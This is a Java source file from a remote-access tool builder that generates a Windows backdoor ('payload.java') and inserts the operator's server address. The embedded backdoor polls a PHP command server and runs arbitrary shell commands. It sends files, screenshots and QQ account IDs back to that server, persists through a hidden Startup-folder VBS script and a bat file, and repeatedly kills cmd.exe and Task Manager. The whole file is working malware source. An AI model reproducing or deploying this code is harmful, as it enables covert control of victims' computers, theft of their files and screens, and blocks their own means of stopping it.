package net.wind.core.Config;

import net.wind.BoyLoader;

import java.io.*;

/**
 * createTime 2022/11/19 0019
 * fileName MakePayload
 *
 * @author Win                                                                                      dStream
 */

public class MakePayload {
    public static String payload;
    public static void createPayload() throws IOException {
        String payload1 = "import sun.misc.BASE64Encoder;\n" +
                "\n" +
                "import javax.imageio.ImageIO;\n" +
                "import javax.swing.*;\n" +
                "import java.awt.*;\n" +
                "import java.awt.image.BufferedImage;\n" +
                "import java.io.*;\n" +
                "import java.net.*;\n" +
                "import java.util.ArrayList;\n" +
                "import java.util.HashMap;\n" +
                "import java.util.List;\n" +
                "import java.util.Map;\n" +
                "\n" +
                "/*** createTime 2022/10/15 0015* fileName payload** @author WindStream*/\n" +
                "\n" +
                "public class payload extends Thread{ protected static String IP;\n" +
                "    public static Map<String, Object> doPost(String url, String content) {Map<String, Object> result = new HashMap<String, Object>();String errorStr = \"\";String status = \"\";String response = \"\";PrintWriter out = null;BufferedReader in = null;\n" +
                "        try {URL realUrl = new URL(url);URLConnection conn = realUrl.openConnection();HttpURLConnection httpUrlConnection = (HttpURLConnection) conn;\n" +
                "            httpUrlConnection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded;charset=utf-8\");httpUrlConnection.setDoOutput(true);httpUrlConnection.setDoInput(true);out = new PrintWriter(httpUrlConnection.getOutputStream());out.write(content);out.flush();httpUrlConnection.connect();\n" +
                "            in = new BufferedReader(new InputStreamReader(httpUrlConnection.getInputStream()));String line;while ((line = in.readLine()) != null) {response += line;}\n" +
                "            status = new Integer(httpUrlConnection.getResponseCode()).toString();} catch (Exception e) {errorStr = e.getMessage();}\n" +
                "        finally {try {if (out != null) { out.close();}if (in != null) {in.close();}} catch (Exception ex) {/*Sign*/}}result.put(\"errorStr\", errorStr);result.put(\"response\", response);result.put(\"status\", status);return result;}\n" +
                "    public static String doGet(String URL){URL=URL.replace(\" \",\"[wind1]\").replace(\"#\",\"[wind2]\").replace(\"+\",\"[wind3]\").replace(\"\\n\",\"[wind5]\").replace(\"\\\\\",\"[wind4]\");//.replace(\"\\n\",\"[wind5]\");\n" +
                "        HttpURLConnection conn = null;InputStream is = null;BufferedReader br = null;StringBuilder result = new StringBuilder();\n" +
                "        try{java.net.URL url = new URL(URL);conn = (HttpURLConnection) url.openConnection();conn.setRequestMethod(\"GET\");conn.setConnectTimeout(15000);conn.setReadTimeout(60000);conn.setRequestProperty(\"Accept\", \"application/json\");conn.connect();\n" +
                "            if (200 == conn.getResponseCode()){is = conn.getInputStream();br = new BufferedReader(new InputStreamReader(is, \"UTF-8\"));String line;while ((line = br.readLine()) != null){result.append(line);}\n" +
                "            }else{return \"null\";}}catch (Exception e){/*Sign*/}finally {try{if(br != null){br.close();}if(is != null){is.close();}}catch (IOException ioe){/*Sign*/}conn.disconnect();}return result.toString().replace(\"[wind1]\",\" \").replace(\"[wind2]\",\"#\").replace(\"[wind3]\",\"+\").replace(\"[wind4]\",\"\\\\\").replace(\"[wind5]\",\"\\n\");\n" +
                "    }public static String getQQID(){Map<String,String> map = System.getenv();String username = map.get(\"USERNAME\");\n" +
                "        File file = new File(\"C:\\\\Users\\\\\"+username+\"\\\\Documents\\\\Tencent Files\");boolean ifHasQQ;if (file.exists()){ifHasQQ =true;}else {ifHasQQ = false;}if (ifHasQQ == true) {String QQIDLIST = \"\";\n" +
                "            for (int i = 0; i < file.listFiles().length; i++) {File file1 = file.listFiles()[i];if (file1.getName().equals(\"All Users\")) {} else {QQIDLIST += file1.getName() + \"circularholeB0yList\";}}return QQIDLIST;}else {return \"[error1337]\";}}\n" +
                "    public static String DownloadFile(String Path){\n" +
                "        StringBuilder stringBuilder = new StringBuilder(\"\");\n" +
                "        try {\n" +
                "            File loadfile = new File(Path);\n" +
                "            if (loadfile.exists()){\n" +
                "            stringBuilder.append(loadfile.getName());\n" +
                "            stringBuilder.append(\"windstream:1145141:1919810]\");\n" +
                "            FileReader fileReader = new FileReader(loadfile);\n" +
                "            BufferedReader bufferedReader = new BufferedReader(fileReader);\n" +
                "            String tmp=null;\n" +
                "            int i=1;\n" +
                "            while ((tmp = bufferedReader.readLine()) != null){\n" +
                "                stringBuilder.append(tmp);\n" +
                "                i++;\n" +
                "            }\n" +
                "            bufferedReader.close();\n" +
                "            fileReader.close();\n" +
                "            }\n" +
                "            else{\n" +
                "                return \"No File or PathName Named \\\"\"+Path+\"\\\"\";\n" +
                "            }\n" +
                "\n" +
                "        }catch(Exception e){\n" +
                "\n" +
                "        }\n" +
                "        return stringBuilder.toString();\n" +
                "    }\n" +
                "    protected static String phpClient = \"\";\n" +
                "    public void run() {\n" +
                "        IP = doGet(\"http://ident.me/\");\n" +
                "        String y_System = System.getProperty(\"os.name\");\n" +
                "        String System = y_System.replace(\" \",\"\");\n" +
                "        doGet(phpClient+\"/connectHost.php?ip=\"+IP);\n" +
                "        doGet(phpClient+\"/ClientSystem.php?ip=\"+IP+\"&system=\"+System);\n" +
                "        doGet(payload.phpClient+\"/ClienthostState.php?ip=\"+payload.IP+\"&state=online\");\n" +
                "        TaskSoft.TaskSoft();\n" +
                "        mainWhile:while(true) {\n" +
                "            setAutoRun();\n" +
                "            Runtime runtime =Runtime.getRuntime();\n" +
                "            String com=null;\n" +
                "            Process process;\n" +
                "            String str = null;\n" +
                "            String reply =\"\";\n" +
                "            try {\n" +
                "                Thread.sleep(1000);\n" +
                "                com = doGet(phpClient+\"/ClientReadServer.php?ip=\"+IP);\n" +
                "                if(com.equals(\"\")){\n" +
                "\n" +
                "                }else {\n" +
                "                    if (com.split(\" \")[0].toLowerCase().equals(\"window\") && com.length() > 7){\n" +
                "                        String window_string = doGet(\"/ServerReadPost.php?ip=\"+IP);\n" +
                "                        doGet(phpClient + \"/ClientShellReply.php?ip=\" + IP + \"&reply=Successful\\n\");\n" +
                "                        JOptionPane.showMessageDialog(null,window_string);\n" +
                "                        //doGet(phpClient + \"/ClientShellReply.php?ip=\" + IP + \"&reply=Successful\\n\");\n" +
                "                        continue mainWhile;\n" +
                "                    } else if (com.split(\" \")[0].toLowerCase().equals(\"download\") && com.length()>9) {\n" +
                "                        doPost(phpClient + \"/ClientPost.php?ip=\"+IP,DownloadFile(com.split(\" \")[1]));\n" +
                "                        continue mainWhile;\n" +
                "                    } else if (com.toLowerCase().equals(\"getqqid\")) {\n" +
                "                        doGet(phpClient + \"/ClientShellReply.php?ip=\" + IP + \"&reply=\"+getQQID()+\"\\n\");\n" +
                "                        continue mainWhile;\n" +
                "                    } else if (com.toLowerCase().equals(\"delhost\")) {\n" +
                "                        doGet(phpClient + \"/ClientShellReply.php?ip=\" + IP + \"&reply=Successful\\n\");\n" +
                "                        File batFile1 = new File(\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindowsRuntime.vbs\");\n" +
                "                        File batFile2 = new File(\"C:\\\\Windows\\\\DesktopSoft.bat\");\n" +
                "                        if (batFile1.exists()){\n" +
                "                            batFile1.delete();\n" +
                "                        }\n" +
                "                        if (batFile2.exists()){\n" +
                "                            batFile2.delete();\n" +
                "                        }\n" +
                "                        java.lang.System.exit(0);\n" +
                "                    } else if (com.toLowerCase().equals(\"screenshot\")) {\n" +
                "                        doPost(phpClient+\"/ClientPost.php?ip=\"+IP,ScreenShot());\n" +
                "                    } else{\n" +
                "                        process = runtime.exec(\"cmd /C \" + com);\n" +
                "                        InputStream inputStream = process.getInputStream();\n" +
                "                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, \"gbk\"));\n" +
                "                        while ((str = bufferedReader.readLine()) != null) {\n" +
                "                            reply += str + \"[wind5]\";\n" +
                "                        }\n" +
                "                        //doGet(phpClient + \"/ClientShellReply.php?ip=\" + IP + \"&reply=\" + reply);\n" +
                "                        doPost(phpClient+\"/ClientPost.php?ip=\"+IP,reply);\n" +
                "                    }}\n" +
                "            } catch (Exception e) {\n" +
                "                doGet(phpClient + \"/ClientShellReply.php?ip=\" + IP + \"&reply=Can't run because a error in program\\n\");\n" +
                "                continue mainWhile;\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "    public static String ScreenShot() {String back =null;try {Robot robot = new Robot();\n" +
                "            Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();Rectangle rectangle = new Rectangle(dimension);BufferedImage bufferedImage = robot.createScreenCapture(rectangle);\n" +
                "            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();ImageIO.write(bufferedImage, \"png\", byteArrayOutputStream);byte[] bytes = byteArrayOutputStream.toByteArray();BASE64Encoder base64Encoder = new BASE64Encoder();String base64image = base64Encoder.encodeBuffer(bytes).trim();\n" +
                "            back = base64image.replaceAll(\"\\n\",\"\").replaceAll(\"\\r\",\"\");byteArrayOutputStream.close();}catch (Exception e){return \"Can't get Screen Picture\";}return back;}\n" +
                "    public static void setAutoRun() {\n" +
                "        try{String Jar_Path = String.valueOf(payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).replace(\"file:/\",\"\");File file = new File(Jar_Path);\n" +
                "        if (file.isDirectory()){}else {File batFile1 = new File(\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindowsRuntime.vbs\");File batFile2 = new File(\"C:\\\\Windows\\\\DesktopSoft.bat\");\n" +
                "        if (batFile2.exists()){batFile2.delete();batFile2.createNewFile();FileWriter batFile2Writer = new FileWriter(batFile2);batFile2Writer.write(\"@echo off\\n\" + \"java -jar \" + Jar_Path);batFile2Writer.close();\n" +
                "        }else {batFile2.createNewFile();FileWriter batFile2Writer = new FileWriter(batFile2);batFile2Writer.write(\"@echo off\\n\" + \"java -jar \" + Jar_Path);batFile2Writer.close();}\n" +
                "        if(batFile1.exists()){batFile1.delete();batFile1.createNewFile();FileWriter batFile1Writer = new FileWriter(batFile1);\n" +
                "            batFile1Writer.write(\"set ws=wscript.createobject(\\\"wscript.shell\\\")\\n\" + \"ws.run \\\"C:\\\\Windows\\\\DesktopSoft.bat /start\\\",0\\n\" + \"wscript.quit\");batFile1Writer.close();}else {batFile1.createNewFile();FileWriter batFile1Writer = new FileWriter(batFile1);\n" +
                "            batFile1Writer.write(\"set ws=wscript.createobject(\\\"wscript.shell\\\")\\n\" + \"ws.run \\\"C:\\\\Windows\\\\DesktopSoft.bat /start\\\",0\\n\" + \"wscript.quit\");batFile1Writer.close();}}}catch (Exception e){doGet(payload.phpClient + \"/ClientShellReply.php?ip=\" + payload.IP + \"&reply=Can't Make AutoRun because a error in program\\n\");}}\n" +
                "    //Main backDoor Program\n" +
                "    public static void backDoor(){payload payload = new payload();payload.setPriority(10);payload.setName(\"System Kernel\");payload.setDaemon(false);payload.start();}}\n" +
                "class TaskSoft extends Thread{ Runtime runtime = Runtime.getRuntime();public void run(){\n" +
                "           ddd:while(true) {try {Thread.sleep(500);List tasklist = new ArrayList();Process process = runtime.exec(\"tasklist\");BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream(),\"utf-8\"));\n" +
                "                String s = \"\";while ((s = br.readLine()) != null) {if (\"\".equals(s)) {continue;}tasklist.add(s+\" \");}\n" +
                "                String maxRow = tasklist.get(1) + \"\";String[] maxCol = maxRow.split(\" \");String[] taskName = new String[tasklist.size()];String[] taskPid = new String[tasklist.size()];String[] taskSessionName = new String[tasklist.size()];String[] taskSession = new String[tasklist.size()];String[] taskNec = new String[tasklist.size()];int i = 0;\n" +
                "                for (int lengh = tasklist.size();i<lengh; i++) {String data = tasklist.get(i) + \"\";int j=0;for (int length = maxCol.length; j < length; j++) {switch (j) {case 0: taskName[i]=data.substring(0, maxCol[j].length()+1);data=data.substring(maxCol[j].length()+1);break; case 1: taskPid[i]=data.substring(0, maxCol[j].length()+1);data=data.substring(maxCol[j].length()+1);break; case 2: taskSessionName[i]=data.substring(0, maxCol[j].length()+1);data=data.substring(maxCol[j].length()+1);break; case 3: taskSession[i]=data.substring(0, maxCol[j].length()+1);data=data.substring(maxCol[j].length()+1);break; case 4: taskNec[i]=data;break;}}}\n" +
                "                int i1=0;\n" +
                "                for (int lengh = taskName.length; i1 < lengh; i1++) {if (taskName[i1].contains(\"cmd.exe\")) {runtime.exec(\"taskkill /PID \"+taskPid[i1]+\" /f\");}}\n" +
                "                runtime.exec(\"cmd /C for /f \\\"tokens=2\\\" %a in ('tasklist /fi \\\"imagename eq Taskmgr.exe\\\" /nh') do taskkill /F /PID %a\");} catch (Exception e) {payload.doGet(payload.phpClient + \"/ClientShellReply.php?ip=\" + payload.IP + \"&reply=Can't run because a error in program\\n\");continue ddd;}}}\n" +
                "    public static void TaskSoft(){TaskSoft taskSoft = new TaskSoft();taskSoft.setName(\"Runtime\");taskSoft.setDaemon(true);taskSoft.setPriority(10);taskSoft.start();}}";
        payload = payload1.replace("protected static String phpClient = \"\";\n","protected static String phpClient = \""+BoyLoader.phpClient+"\";\n");
        payload1=null;
               File payloadFile = new File(BoyLoader.WorkingDir+BoyLoader.sqlitSigh+"Payload"+BoyLoader.sqlitSigh+"payload.java");
               if (payloadFile.exists()){
                   payloadFile.delete();
                   payloadFile.createNewFile();
                   FileWriter fileWriter = new FileWriter(payloadFile);
                   fileWriter.write(payload);
                   fileWriter.close();
               }else{
                   payloadFile.createNewFile();
                   FileWriter fileWriter = new FileWriter(payloadFile);
                   fileWriter.write(payload);
                   fileWriter.close();
               }
               BoyLoader.print("Built the payload in "+BoyLoader.WorkingDir+BoyLoader.sqlitSigh+"Payload"+BoyLoader.sqlitSigh+"payload.java");
    }
}
